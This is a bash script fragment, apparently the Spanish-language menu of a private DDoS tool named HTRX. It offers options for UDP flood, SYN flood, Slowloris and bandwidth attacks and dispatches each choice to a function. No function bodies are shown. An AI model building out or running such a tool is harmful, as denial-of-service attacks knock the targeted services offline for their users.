Take_input1()
{
clear
while :
do
clear
echo -e "${WHITE}HTRX${RED}                           User:"${LIGHTBLUE}$(whoami)"${RED}Expires:"${LIGHTBLUE}Lifetime
echo -e "${WHITE}                                                MENU PRIVADO 6.0 BIENVENIDO
Bypass [${GREEN}ON${WHITE}]                             "${WHITE}Tu Version: "${GREEN}v6.0 "${RED}[Verison Privada]
echo -e "${WHITE}
                                                       HTRX PRIVADO 1.0 ${WHITE}
               / \ / \ / \ / \                 -------------------------------------${CYAN}
              ( H | T | R | X |                ${LIGHTBLUE}¦  Estas conectado a HTRX ¦${WHITE}
               \_/ \_/ \_/ \_/                 -------------------------------------
"${WHITE}
    echo -e "${WHITE}Nota: "${GREEN}PARA SALIR DE UN ESCRITURA O DETENER ATAQUES, PULSE [CTRL + C] 14
    echo -e "${GREEN}[==============================================================================]"
	echo -e "${LIGHTBLUE}[1]${GREEN}UDP Flood${LIGHTBLUE}                                             [5]${GREEN}Bandwidth${LIGHTBLUE}"                                                                                         																									
    echo -e "${LIGHTBLUE}[2]${GREEN}UDP Flood B${LIGHTBLUE}                                           [6]${GREEN}SyN Flood${BLUE}"
    echo -e "${LIGHTBLUE}[3]${GREEN}Xtreme FlooD${LIGHTBLUE}                                          [7]${LIGHTBLUE}MULTI UPDATED${CYAN}"
    echo -e "${LIGHTBLUE}[4]${GREEN}SLOWLORIS${LIGHTBLUE}                                             [8]${GREEN}HTRX SCRIPT${LIGHTBLUE}"
    echo -e ""                                                                 
    echo -e "${PURPLE}[==============================================================================]"
    echo -e "${PURPLE}                                 ~OPTIONS~                                      "
    echo -e "${LIGHTBLUE}[9]${GREEN}Cambia la contra${LIGHTBLUE}                                      [AI]${GREEN}Instalador"
	echo -e "${LIGHTBLUE}[10]${GREEN}Dstat${LIGHTBLUE}                                                [12]${GREEN}Panel de admin"
	echo -e "${LIGHTBLUE}[11]${GREEN}Ataque & Dstat${LIGHTBLUE}                                       [13]${GREEN}Salir del menu"
    echo -e ""
    echo -n "#HTRX - Menu [1-13-AI]: "
    read yourch
    case $yourch in
      1) udp_flooda ;;
      2) udp_floodb ;;
      3) slap ;;
	  4) slowloris ;;
	  8) fry ;;
         5) bw ;;
         6) syn ;;
	  14) killall ;;
	  9) passwd ;;
	  7) multi ;;
	  10) dstat1 ;;
	  11) and ;;
	  12) admin12 ;;
	  AI) autoinstall ;;
      ex) echo "As you Command" ;  exit 1  ;;
	  13) pkill menu  ;;
      *) echo "Invalid Selection, Please make another selection between [1-11]" ;
         echo "Press Enter. . ." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_input1
#
Take_input1